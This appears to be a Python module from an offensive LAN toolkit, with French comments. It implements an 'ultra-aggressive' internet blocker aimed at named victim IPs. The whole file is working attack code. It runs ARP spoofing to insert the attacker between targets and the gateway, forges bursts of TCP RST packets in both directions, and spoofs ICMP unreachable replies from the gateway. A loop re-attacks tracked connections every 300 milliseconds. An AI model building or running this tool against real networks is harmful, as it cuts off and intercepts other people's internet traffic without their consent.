"""
modules/internet_control.py
Contrôle d'accès Internet ULTRA-AGRESSIF v2.
- Blocage total ou sélectif
- Multi-thread pour réaction instantanée
- Attaque proactive continue
- Intégration automatique ARP spoofing
"""
import time
import threading
from typing import List, Set, Optional
from dataclasses import dataclass, field

from scapy.all import (
    sniff, send, sendp, IP, TCP, UDP, ICMP, Ether, ARP,
    conf as scapy_conf
)

from core.logger import log
from core.config import conf, attack_conf
from core.utils import resolve_domain, expand_cidr, is_valid_cidr, Counter


@dataclass
class BlockStats:
    """Stats de blocage."""
    tcp_killed: int = 0
    udp_blocked: int = 0
    icmp_blocked: int = 0
    rst_sent: int = 0


class InternetBlockerV2:
    """
    Bloqueur Internet ULTRA-AGRESSIF.
    
    3 modes:
    - FULL: Bloque TOUT (aucun accès Internet)
    - SELECTIVE: Bloque certains domaines
    - PORT: Bloque certains ports
    
    Techniques:
    - RST en rafale sur TCP
    - ICMP Unreachable sur UDP
    - Drop + attaque proactive
    """
    
    RST_BURST = 8  # RST par connexion
    ATTACK_INTERVAL = 0.3  # Attaque toutes les 300ms
    
    def __init__(
        self,
        targets: List[str] = None,
        blocked_domains: List[str] = None,
        blocked_ports: List[int] = None,
        full_block: bool = False,
        auto_arp: bool = True
    ):
        # Cibles (victimes)
        self.target_ips: Set[str] = set()
        self._expand_targets(targets or [])
        
        # Ce qu'on bloque
        self.blocked_domains = blocked_domains or []
        self.blocked_ports = set(blocked_ports) if blocked_ports else set()
        self.full_block = full_block
        
        # IPs bloquées (résolues depuis domaines)
        self.blocked_ips: Set[str] = set()
        
        # Whitelist (ne jamais bloquer)
        self.whitelist: Set[str] = {conf.attacker_ip, conf.gateway_ip}
        
        # ARP Spoofing intégré
        self.auto_arp = auto_arp
        self._arp_running = False
        self._arp_thread: Optional[threading.Thread] = None
        
        # État
        self.running = False
        self._sniff_thread: Optional[threading.Thread] = None
        self._attack_thread: Optional[threading.Thread] = None
        self._dns_thread: Optional[threading.Thread] = None
        self._lock = threading.RLock()
        
        # Connexions trackées
        self._active_conns: dict = {}
        
        # Stats
        self.stats = BlockStats()
        self.start_time = 0.0
    
    def _expand_targets(self, targets: List[str]):
        """Expanse les cibles (CIDR -> IPs)."""
        for target in targets:
            if is_valid_cidr(target):
                for ip in expand_cidr(target):
                    if ip != conf.attacker_ip and ip != conf.gateway_ip:
                        self.target_ips.add(ip)
            else:
                if target and target != conf.attacker_ip and target != conf.gateway_ip:
                    self.target_ips.add(target)
    
    def _resolve_dns_loop(self):
        """Résout les domaines en boucle."""
        while self.running:
            for domain in self.blocked_domains:
                if not self.running:
                    break
                try:
                    clean = domain.replace("*.", "").replace(".*", "")
                    ips = set()
                    
                    # Domaine principal
                    ips.update(resolve_domain(clean))
                    
                    # Sous-domaines
                    for prefix in ["www", "m", "api", "cdn", "static", "media", 
                                   "edge", "video", "img", "images", "assets"]:
                        try:
                            ips.update(resolve_domain(f"{prefix}.{clean}"))
                        except:
                            pass
                    
                    if ips:
                        with self._lock:
                            old = len(self.blocked_ips)
                            self.blocked_ips.update(ips)
                            if len(self.blocked_ips) > old:
                                log.debug(f"DNS {domain}: {len(ips)} IPs")
                except:
                    pass
            
            for _ in range(15):
                if not self.running:
                    break
                time.sleep(1)
    
    def _arp_poison_loop(self):
        """ARP Spoofing intégré pour MITM."""
        log.info("ARP Spoofing démarré...")
        
        # Obtenir MAC de la gateway
        gateway_mac = conf.gateway_mac
        if not gateway_mac:
            log.warning("Gateway MAC inconnu, ARP spoof limité")
            return
        
        while self._arp_running and self.running:
            for target_ip in list(self.target_ips):
                if not self.running:
                    break
                
                try:
                    # Dire à la cible que NOUS sommes la gateway
                    pkt1 = ARP(
                        op=2,  # is-at
                        psrc=conf.gateway_ip,
                        hwsrc=conf.attacker_mac,
                        pdst=target_ip
                    )
                    send(pkt1, verbose=False, iface=conf.interface)
                    
                    # Dire à la gateway que NOUS sommes la cible
                    pkt2 = ARP(
                        op=2,
                        psrc=target_ip,
                        hwsrc=conf.attacker_mac,
                        pdst=conf.gateway_ip
                    )
                    send(pkt2, verbose=False, iface=conf.interface)
                    
                except Exception:
                    pass
            
            time.sleep(1)
    
    def _should_block(self, src_ip: str, dst_ip: str, 
                      src_port: int = 0, dst_port: int = 0) -> bool:
        """Détermine si on doit bloquer ce trafic."""
        # Identifier l'IP distante (serveur)
        if src_ip in self.target_ips:
            remote_ip = dst_ip
            remote_port = dst_port
        elif dst_ip in self.target_ips:
            remote_ip = src_ip
            remote_port = src_port
        else:
            return False
        
        # Whitelist
        if remote_ip in self.whitelist:
            return False
        
        # Mode FULL: tout bloquer
        if self.full_block:
            return True
        
        # Mode PORT
        if self.blocked_ports:
            if remote_port in self.blocked_ports or src_port in self.blocked_ports:
                return True
        
        # Mode DOMAIN
        if self.blocked_ips:
            with self._lock:
                if remote_ip in self.blocked_ips:
                    return True
        
        return False
    
    def _send_rst_burst(self, src_ip: str, dst_ip: str,
                        src_port: int, dst_port: int,
                        seq: int = 0, ack: int = 0):
        """Envoie une rafale de RST."""
        try:
            packets = []
            
            for i in range(self.RST_BURST):
                seq_v = seq + i * 1460
                ack_v = ack + i * 1460
                
                # RST vers serveur
                packets.append(IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=src_port, dport=dst_port, flags="R", seq=seq_v
                ))
                packets.append(IP(src=src_ip, dst=dst_ip) / TCP(
                    sport=src_port, dport=dst_port, flags="RA", seq=seq_v, ack=ack
                ))
                
                # RST vers client
                packets.append(IP(src=dst_ip, dst=src_ip) / TCP(
                    sport=dst_port, dport=src_port, flags="R", seq=ack_v
                ))
                packets.append(IP(src=dst_ip, dst=src_ip) / TCP(
                    sport=dst_port, dport=src_port, flags="RA", seq=ack_v, ack=seq_v
                ))
            
            for pkt in packets:
                send(pkt, verbose=False, iface=conf.interface)
            
            with self._lock:
                self.stats.rst_sent += len(packets)
                
        except Exception:
            pass
    
    def _send_icmp_unreachable(self, original_pkt):
        """Envoie ICMP Destination Unreachable."""
        try:
            # Type 3 = Destination Unreachable
            # Code 1 = Host Unreachable
            # Code 3 = Port Unreachable
            icmp_reply = IP(
                src=conf.gateway_ip,
                dst=original_pkt[IP].src
            ) / ICMP(
                type=3,
                code=1  # Host unreachable
            ) / original_pkt[IP]
            
            send(icmp_reply, verbose=False, iface=conf.interface)
            self.stats.icmp_blocked += 1
        except:
            pass
    
    def _packet_callback(self, pkt):
        """Callback pour chaque paquet."""
        if not pkt.haslayer(IP):
            return
        
        ip = pkt[IP]
        src_ip = ip.src
        dst_ip = ip.dst
        
        # TCP
        if pkt.haslayer(TCP):
            tcp = pkt[TCP]
            
            # Ignorer nos RST
            if int(tcp.flags) & 0x04 and src_ip == conf.attacker_ip:
                return
            
            if self._should_block(src_ip, dst_ip, tcp.sport, tcp.dport):
                # Tracker
                key = f"{src_ip}:{tcp.sport}-{dst_ip}:{tcp.dport}"
                with self._lock:
                    if key not in self._active_conns:
                        self._active_conns[key] = {
                            "src_ip": src_ip, "dst_ip": dst_ip,
                            "src_port": tcp.sport, "dst_port": tcp.dport,
                            "seq": tcp.seq, "ack": tcp.ack,
                            "time": time.time()
                        }
                        self.stats.tcp_killed += 1
                        log.attack(f"BLOCK TCP: {src_ip}:{tcp.sport} -> {dst_ip}:{tcp.dport}")
                    else:
                        self._active_conns[key]["seq"] = tcp.seq
                        self._active_conns[key]["ack"] = tcp.ack
                        self._active_conns[key]["time"] = time.time()
                
                # RST immédiat
                self._send_rst_burst(src_ip, dst_ip, tcp.sport, tcp.dport, tcp.seq, tcp.ack)
        
        # UDP
        elif pkt.haslayer(UDP):
            udp = pkt[UDP]
            if self._should_block(src_ip, dst_ip, udp.sport, udp.dport):
                self.stats.udp_blocked += 1
                self._send_icmp_unreachable(pkt)
        
        # ICMP (ping)
        elif pkt.haslayer(ICMP):
            if self.full_block and self._should_block(src_ip, dst_ip):
                self.stats.icmp_blocked += 1
    
    def _proactive_attack_loop(self):
        """Attaque proactive sur les connexions trackées."""
        while self.running:
            now = time.time()
            to_remove = []
            
            with self._lock:
                conns = list(self._active_conns.items())
            
            for key, conn in conns:
                if not self.running:
                    break
                
                # Supprimer les vieilles connexions (> 60s)
                if now - conn["time"] > 60:
                    to_remove.append(key)
                    continue
                
                # Attaque!
                self._send_rst_burst(
                    conn["src_ip"], conn["dst_ip"],
                    conn["src_port"], conn["dst_port"],
                    conn["seq"], conn["ack"]
                )
            
            # Cleanup
            if to_remove:
                with self._lock:
                    for key in to_remove:
                        self._active_conns.pop(key, None)
            
            time.sleep(self.ATTACK_INTERVAL)
    
    def _sniff_loop(self):
        """Thread de sniffing."""
        # Filtre BPF
        if self.target_ips:
            ip_filters = [f"host {ip}" for ip in list(self.target_ips)[:10]]
            bpf = f"({' or '.join(ip_filters)}) and (tcp or udp or icmp)"
        else:
            bpf = "tcp or udp or icmp"
        
        log.info(f"Sniff: {bpf[:60]}...")
        
        try:
            sniff(
                iface=conf.interface,
                filter=bpf,
                prn=self._packet_callback,
                stop_filter=lambda x: not self.running,
                store=0
            )
        except Exception as e:
            if self.running:
                log.error(f"Sniff error: {e}")
    
    def start(self):
        """Démarre le blocage."""
        if self.running:
            return
        
        if not self.target_ips:
            log.error("Aucune cible!")
            return
        
        self.running = True
        self.start_time = time.time()
        
        # Banner
        log.attack("=" * 50)
        mode = "TOTAL" if self.full_block else "SÉLECTIF"
        log.attack(f"INTERNET BLOCKER - Mode {mode}")
        log.attack("=" * 50)
        log.info(f"Cibles: {', '.join(self.target_ips)}")
        
        if self.blocked_domains:
            log.info(f"Domaines: {', '.join(self.blocked_domains)}")
        if self.blocked_ports:
            log.info(f"Ports: {self.blocked_ports}")
        
        # Démarrer ARP Spoofing
        if self.auto_arp:
            self._arp_running = True
            self._arp_thread = threading.Thread(target=self._arp_poison_loop, daemon=True)
            self._arp_thread.start()
            time.sleep(2)  # Laisser l'ARP s'établir
        
        # DNS resolver
        if self.blocked_domains:
            self._dns_thread = threading.Thread(target=self._resolve_dns_loop, daemon=True)
            self._dns_thread.start()
            time.sleep(2)
            log.info(f"IPs bloquées: {len(self.blocked_ips)}")
        
        # Sniff
        self._sniff_thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._sniff_thread.start()
        
        # Attaque proactive
        self._attack_thread = threading.Thread(target=self._proactive_attack_loop, daemon=True)
        self._attack_thread.start()
        
        log.success("Blocage Internet ACTIF!")
    
    def stop(self):
        """Arrête le blocage."""
        if not self.running:
            return
        
        log.info("Arrêt du blocage...")
        self.running = False
        self._arp_running = False
        
        # Restaurer ARP si nécessaire
        if self.auto_arp and conf.gateway_mac:
            log.info("Restauration ARP...")
            for target_ip in self.target_ips:
                try:
                    # Restaurer pour la cible
                    pkt = ARP(
                        op=2,
                        psrc=conf.gateway_ip,
                        hwsrc=conf.gateway_mac,
                        pdst=target_ip
                    )
                    send(pkt, count=3, verbose=False, iface=conf.interface)
                except:
                    pass
        
        # Attendre threads
        for t in [self._sniff_thread, self._attack_thread, self._dns_thread, self._arp_thread]:
            if t and t.is_alive():
                t.join(timeout=2.0)
        
        # Stats
        duration = time.time() - self.start_time
        log.success(f"Blocage arrêté après {duration:.1f}s")
        log.info(f"  TCP tués: {self.stats.tcp_killed}")
        log.info(f"  UDP bloqués: {self.stats.udp_blocked}")
        log.info(f"  RST envoyés: {self.stats.rst_sent}")
    
    def add_domain(self, domain: str):
        """Ajoute un domaine."""
        if domain not in self.blocked_domains:
            self.blocked_domains.append(domain)
            try:
                ips = resolve_domain(domain)
                with self._lock:
                    self.blocked_ips.update(ips)
                log.info(f"Domaine ajouté: {domain}")
            except:
                pass
    
    def add_port(self, port: int):
        """Ajoute un port."""
        self.blocked_ports.add(port)
    
    def get_stats(self) -> dict:
        """Stats."""
        return {
            "running": self.running,
            "mode": "full" if self.full_block else "selective",
            "targets": len(self.target_ips),
            "tcp_killed": self.stats.tcp_killed,
            "udp_blocked": self.stats.udp_blocked,
            "rst_sent": self.stats.rst_sent,
            "active_conns": len(self._active_conns),
            "blocked_ips": len(self.blocked_ips)
        }


# Alias pour compatibilité
InternetBlocker = InternetBlockerV2
